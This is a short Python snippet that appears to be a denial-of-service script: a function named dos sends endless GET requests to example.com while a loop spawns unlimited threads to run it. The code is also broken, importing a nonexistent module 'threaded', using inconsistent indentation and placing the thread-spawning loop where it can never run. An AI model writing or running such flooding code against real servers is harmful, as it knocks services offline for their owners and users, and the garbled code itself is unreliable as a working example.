import threading
import threaded
import requests

      def dos():
         while True:
            requests.get("http://example.com")

         while True:
            threading.Thread(target=dos).start()    